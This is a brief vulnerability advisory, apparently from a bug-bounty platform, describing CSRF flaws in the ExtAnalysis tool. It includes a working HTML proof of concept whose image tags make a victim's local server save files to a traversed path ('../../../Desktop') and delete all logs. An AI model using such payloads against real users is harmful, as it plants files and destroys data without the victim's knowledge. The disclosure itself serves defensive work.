# Overview

The `ExtAnalysis` project is vulnerable against various CSRFs, that could lead to loss of functionalities and placement of malicious files in arbitrary directories without knowledge of the victim.

# Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))

1. Download the git project and run the server through the `python2 extanalysis.py` command
2. Insert on a malicious host the following code

```html
<html>
  <!-- Downloads the Gmass extension in the `Desktop` folder. Fix: avoid `../`   CSRF token -->
  <img
    src="http://127.0.0.1:13337/api/?query=dlanalysis&extid=ehomdgjhgmbidokdgicgmdiedadncbgf&savedir=../../../Desktop/hacked"
  />
  <!-- Deletes all the log without knowledge of the victim. Fix: add CSRF token -->
  <img src="http://127.0.0.1:13337/api/?query=deleteAll" />
</html>
```
